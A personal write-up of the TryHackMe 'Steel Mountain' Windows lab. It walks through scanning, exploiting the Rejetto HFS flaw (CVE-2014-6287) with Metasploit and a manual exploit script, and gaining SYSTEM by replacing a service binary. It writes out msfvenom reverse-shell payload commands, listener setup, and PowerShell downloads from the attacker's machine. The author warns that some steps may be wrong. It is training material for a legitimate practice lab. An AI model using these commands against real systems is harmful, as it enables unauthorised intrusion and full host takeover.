# This is a writeup for the CTF: Steel Mountain, windows from TryHackMe.   
Name: Alexander Spiesberger    
Date: 26/01/2021   
Contact: alex.spiesberger@gmail.com  

---
## *This is a bit chaotic and some things may be wrong because I did the writeup way later than the CTF*   
---

![CTF](assets/1.png)

So, as the list times, we start with scanning with nmap, gobuster and nikto.  

![Scan](assets/2.png)

During the scan we can go check out the site, we can see the logo with a picture of their employee of the month.  
When inspecting the page we can see the picture source code, and we can aassume that the name in the picture is the employee.  
We can with this, respond to the first question: **Who is the employee of the month?**
   
We can then take a look at the finished nmap scan.  
We can find another web server running and with this respond to the next question: **Scan the machine with nmap. What is the other port running a web server on?**

![other web server](assets/4.png)

We can directly also respond to the next question with a quick search: **Take a look at the other web server. What file server is running?**

![file server](assets/5.png)

And the CVE for the next question also:

![Search CVE](assets/6.png)

![CVE](assets/7.png)

We will now try to use metasploit:

![msfconsole](assets/8.png)

We can now put the options that we need and run it:

![run -j](assets/9.png)

Yay! It worked, now we just have to use it:

![use session](assets/10.png)

We can then answer the final question of the second task: **Use Metasploit to get an initial shell. What is the user flag?**

![flag](assets/11.png)

We then have to upload a tool to help us escalate privileges.  
I downloaded winPEAS and also accesschk:

![winPEAS](assets/12.png)
![acesschk](assets/13.png)

We can then see that the service "AdvancedSystemCareService9" is exploitable, just use msfvenom: 

![msfvenom](assets/14.png)

You name it Advanced.exe so when it will run, the service normally sees "dvancedA" and there is a space before "SystemCare" So we will put the msfvenom output that we name "Advanced.exe" in this file, we just download it after starting a server with:

![loadpowershell](assets/15.png)

![downlaod](assets/16.png)

Now you have to start and stop the service with:
sc start <service>
sc stop <service>
the service here is "AdvancedSystemCareService9"

![startstop](assets/17.png)

Don't forget to put a nc listener before restarting the service and then let the magic happen:

![magic](assets/18.png)   

---

## To do it like in the exercie:     

Escalations:
We download the tools to see how we can escalate, and in metasploit we use it: upload:   
→ path to file on your machine.  
→ We then load powershell -> load powershell -> powershell_shell -> . .\PowerUp.ps1 -> Invoke-AllChecks  
→ We can do it with winPEAS and accesschk, can be better.  
→ We see the services and we see. can restart = True on  “AdvancedSystemCareService9”  
→ The application is also writeable to, so we can pretty much do what we want.  

We can then to have a listener for our reverse shell use multi/handler on metasploit, we set the payload to:
→ set payload windows/shell/reverse_tcp
→ set LHOST <IP>
→ set LPORT <PORT>
→ exploit -j 
→ Go back to backgrounded session (meterpreter)

→ We create our msfvenom:   
→ "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o ASCService.exe   
→ (-p = platform. -e = encrypt, -o = output as)   
→ Upload it in IObit -> upload ASCService.exe    
→ Now we need to stop the service, copy the malicious program into  Advanced SystemCare, overwrite current ACSService.exe and restart the service, and we should get our multi/handler that is running     
→ so we go into shell -> sc stop <ServiceName> -> This enables us to modify the path     
→ COPY ASCService.exe “Advanced SystemCare” -> Overwrite -> YES    
→ sc start <ServiceName> -> We start service back up and it will run our malicious program and call our listener on the other side -> session 2 has opened (multi/handler)     
→ we background our meterpreter and see sessions -> We have a new reverse shell and hop to it    
→ And we are now NT Authoritysystem    
→ cd “C:\Windows\Administrator\Desktop” -> dir -> We see root.txt 





# MANUAL:

launching nmap: nmap -sC -sV -A -p- -oN initial.nmap $RHOST
gobuster: gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$RHOST -x php,html,txt,js,css,cgi,sh,py

Found rejetto vuln -> CVE2014-6287
DL nc binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

In the Exploit file change the ip + local port I did (4444)

![changeIPPORT](assets/19.png)
then launch a server (python3 -m http.server 80) Here on port 80.

then launch 2 times the exploit: python <exploit> <IP> <PORT(8080)>

![2timeslaunch](assets/20.png)

First it will pull the binary, then launch it again with a listener (nc -lvnp 4444) and you now have a remote shell.
We now pull winPEAS with powershell:
launch server port 80 then pull with powershell:
powershell -c wget "http://<IP>:80/winPEASany.exe" -outfile "winPEAS.exe"

we now can run it -> winPEAS.exe

![run winpeas](assets/21.png)

for the question: powershell -c get-service

We now need to exploit like previously with msfvenom, we could build it with pentest.ws and taking info with 
"powershell -c systeminfo"
But I will here take the previous msfvenom done with metasploit.
If you want to do it with pentest.ws:
payload:windows/reverse_tcp
LHOST: add your vpn IP
LPORT: Port you want to listen on (I put 443)
encoder: x86/shikata_ga_nai
extension: -f exe
output file: -o ASCService.exe

Then it is like before, pull it, in the IObit folder, name it Advanced.exe and stop/start the service with a netcat listening:

![download](assets/16.png)

![start/stop service](assets/17.png)

hope I could help you even if this one is chaotic.    
contact: alex.spiesberger@gmail.com




